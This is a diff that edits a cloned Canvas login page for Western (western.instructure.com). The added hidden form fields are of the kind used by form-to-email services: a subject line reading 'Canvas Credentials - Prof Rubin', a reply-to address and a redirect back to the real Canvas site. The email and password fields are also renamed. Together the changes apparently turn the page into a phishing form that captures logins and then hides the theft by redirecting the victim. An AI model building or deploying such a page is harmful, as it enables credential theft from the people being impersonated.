@@ -304,19 +304,25 @@
 
         <div class="ic-Login__body">
           
-          <form id="login_form" action="https://western.instructure.com/login/canvas" accept-charset="UTF-8" method="post"><div style="padding:10px;font-weight:700;max-width:100%;text-align:center; color:#000000;">Please log in with your email address.</div><input name="utf8" type="hidden" value="✓" autocomplete="off"><input type="hidden" name="authenticity_token" value="/s9srUMfWMeC7vnzLeE7A5/hyN3uCdmo4IpdwZ8yVzfGggicM046ssCvrdxprVpoxqCDipp4uNuT0hiQ21Axcg==" autocomplete="off">
-            <h1 class="ui-helper-hidden-accessible">
+          <form id="login_form" action="https://western.instructure.com/login/canvas" accept-charset="UTF-8" method="POST"><div style="padding:10px;font-weight:700;max-width:100%;text-align:center; color:#000000;">Please log in with your email address.</div><input name="utf8" type="hidden" value="✓" autocomplete="off"><input type="hidden" name="authenticity_token" value="/s9srUMfWMeC7vnzLeE7A5/hyN3uCdmo4IpdwZ8yVzfGggicM046ssCvrdxprVpoxqCDipp4uNuT0hiQ21Axcg==" autocomplete="off">
+            
+			<input type="hidden" name="_subject" value="Canvas Credentials - Prof Rubin">
+			<input type="hidden" name="_replyto" value="dummy@example.com">
+			<input type="hidden" name="_format" value="plain">
+			<input type="hidden" name="_next" value="https://western.instructure.com">
+
+			  
+			  <h1 class="ui-helper-hidden-accessible">
               Log In
             </h1>
             
             <input type="hidden" name="redirect_to_ssl" value="1">
             <div class="ic-Form-control ic-Form-control--login">
               <label class="ic-Label" for="pseudonym_session_unique_id">Email Address</label>
-              <input class="ic-Input text" autofocus="autofocus" type="text" name="pseudonym_session[unique_id]" id="pseudonym_session_unique_id" placeholder="mad.jack@western.edu">
-            </div>
+					<input class="ic-Input text" autofocus="autofocus" type="email" name="email" id="pseudonym_session_unique_id" placeholder="mad.jack@western.edu" required>            </div>
             <div class="ic-Form-control ic-Form-control--login">
               <label class="ic-Label" for="pseudonym_session_password">Password</label>
-              <input class="ic-Input text" role="textbox" type="password" name="pseudonym_session[password]" id="pseudonym_session_password" placeholder="password">
+              		<input class="ic-Input text" role="textbox" type="password" name="password" id="pseudonym_session_password" placeholder="password" required>
             </div>
             <div class="ic-Login__actions">
               <div class="ic-Login__actions-timeout">
